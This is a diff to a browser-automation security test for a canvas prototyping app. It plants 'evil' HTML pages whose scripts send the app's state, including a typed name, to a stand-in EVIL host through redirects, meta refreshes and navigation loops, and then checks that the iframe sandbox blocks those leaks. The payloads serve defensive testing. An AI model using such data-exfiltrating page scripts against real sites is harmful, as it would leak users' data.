@@ -75,7 +75,7 @@ if (!appUrl) {
 
 const state = `JSON.stringify(canvas.state)`;
 const loop = (k, stop = false) => `<h1>Innocent</h1><script>setInterval(() => { location.href = ${JSON.stringify(EVIL)} + '/${k}?s=' + encodeURIComponent(${state});${stop ? ' setTimeout(() => window.stop(), 30);' : ''} }, 100);</script>`;
-const hashPage = () => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>setTimeout(() => { for (const h of ['#sec', '#']) { const a = document.createElement('a'); a.href = h; document.body.append(a); a.click(); } }, 300);</script>`;
+const hashPage = () => `<h1>Innocent</h1><div style="height:3000px"></div><h2 id="sec">sec</h2><script>addEventListener('hashchange', () => { document.body.dataset.hc = (+document.body.dataset.hc || 0) + 1; }); setTimeout(() => { for (const h of ['#sec', ' #', '#']) { const a = document.createElement('a'); a.href = h; document.body.append(a); a.click(); } }, 300);</script>`;
 const evil = {
   location: `<h1>Innocent</h1><script>location.href = ${JSON.stringify(EVIL)} + '/location?s=' + encodeURIComponent(${state});</script>`,
   meta: `<h1>Innocent</h1><script>const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=${EVIL}/meta?s=' + encodeURIComponent(${state}); document.head.append(m);</script>`,
@@ -102,8 +102,12 @@ const evil = {
 
 const browser = await chromium.launch({ channel: 'chrome', headless: true });
 let code = 0;
+// a stuck browser call must end the run with a message, not hang it
+const watchdog = setTimeout(() => { console.error(`FAIL (${mode}): no result after 4 minutes (stuck browser call?)`); process.exit(1); }, 240_000);
+watchdog.unref?.();
 try {
   const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
+  page.setDefaultTimeout(20_000);
   const errors = [];
   page.on('pageerror', (e) => errors.push(String(e)));
   await page.goto(appUrl);
@@ -162,7 +166,8 @@ try {
   for (const k of benignKeys) {
     const id = await idOf(k);
     const text = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('h1').textContent({ timeout: 1500 }).catch(() => null);
-    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length };
+    const hc = await page.locator(`[data-node-id="${id}"] iframe`).contentFrame().locator('body').getAttribute('data-hc', { timeout: 1500 }).catch(() => null);
+    benign[k] = { intact: text === 'Innocent', requests: leaked(k).length, hashchange: Number(hc) >= 1 };
   }
   const typedValue = await t.frameLocator('iframe').locator('#i').inputValue({ timeout: 1500 }).catch(() => null);
   const typedGone = (await t.locator('.pg-gone').count()) > 0;
@@ -172,30 +177,34 @@ try {
   // on the canvas as an idle thumbnail; that request has no state, the Play one carries the name.
   const playKeys = ['play', 'fakeplay', 'play204', 'playdownload', 'playstop', 'playbeacon'];
   const playBenign = ['playhash'];
-  await page.evaluate(({ html, signupId, playKeys }) => {
-    for (const k of playKeys) {
-      app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html: html[k] });
-      const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id;
-      app.dispatch('page.link', { from: signupId, to: id, label: 'Go ' + k });
-    }
-  }, { html: evil, signupId: signup, playKeys: [...playKeys, ...playBenign] });
   const dev = page.locator('.pg-device');
   const playRes = {};
+  // Pages that loop on a navigation keep the browser busy, so each one is added just before its run and removed after it
+  // (and the idle evil pages are removed first): a pile of them once stalled the strict-mode run.
+  await page.evaluate((titles) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => titles.includes(n['x-page']?.title)).map((n) => n.id) }), idleKeys.map((k) => 'Evil ' + k));
   for (const k of [...playKeys, ...playBenign]) {
+    await page.evaluate(({ html, signupId, k }) => {
+      app.dispatch('page.create', { x: 1800, y: 600, title: 'Evil ' + k, html });
+      const id = app.doc.nodes.find((n) => n['x-page']?.title === 'Evil ' + k).id;
+      app.dispatch('page.link', { from: signupId, to: id, label: 'Go ' + k });
+    }, { html: evil[k], signupId: signup, k });
     await page.evaluate((id) => app.prototype.player.start(id), signup);
     await dev.frameLocator('iframe').locator('[data-store="name"]').fill('Ada Secret');
     await page.waitForTimeout(300);
     await page.locator('.pg-chip', { hasText: new RegExp(`→\\s+Evil ${k}$`) }).click();
     await page.waitForTimeout(2500);
-    const r = { gone: (await dev.locator('.pg-gone').count()) > 0, still: await dev.frameLocator('iframe').locator('h1').textContent({ timeout: 1000 }).catch(() => null) };
+    const r = { hashchange: Number(await dev.frameLocator('iframe').locator('body').getAttribute('data-hc', { timeout: 1000 }).catch(() => null)) >= 1, gone: (await dev.locator('.pg-gone').count()) > 0, still: await dev.frameLocator('iframe').locator('h1').textContent({ timeout: 1000 }).catch(() => null) };
     await page.keyboard.press('Escape');
     await page.waitForTimeout(300);
     r.closed = !(await page.evaluate(() => app.prototype.player.isOpen));
     r.hits = leaked(k).filter((h) => stateOf(h) !== '{}');
     playRes[k] = r;
+    await page.evaluate((k) => app.dispatch('core.delete', { ids: app.doc.nodes.filter((n) => n['x-page']?.title === 'Evil ' + k).map((n) => n.id) }), k);
   }
 
-  const benignOk = benignKeys.every((k) => benign[k].intact && benign[k].requests === 0) && playBenign.every((k) => playRes[k].still === 'Innocent' && !playRes[k].gone && playRes[k].hits.length === 0 && playRes[k].closed);
+  // srcdoc: the runtime sets the hash, so hashchange fires. Strict: the frame host's navigation guard cancels every navigation, fragment ones too (known, nothing leaks).
+  const hashWorks = mode === 'srcdoc';
+  const benignOk = benignKeys.every((k) => benign[k].intact && (benign[k].hashchange || !hashWorks || !idleScripts) && benign[k].requests === 0) && playBenign.every((k) => playRes[k].still === 'Innocent' && (playRes[k].hashchange || !hashWorks) && !playRes[k].gone && playRes[k].hits.length === 0 && playRes[k].closed);
   console.log(`in-page links: idle ${JSON.stringify(benign)}; Play ${JSON.stringify(Object.fromEntries(playBenign.map((k) => [k, { still: playRes[k].still, removed: playRes[k].gone }])))}`);
   const rows = [...idleKeys.map((k) => [k, leaked(k)]), ...playKeys.map((k) => [k, playRes[k].hits])];
   for (const k of navKeys) console.log(`idle ${k}: shows own content ${nav[k].intact}, frame removed ${nav[k].gone}`);
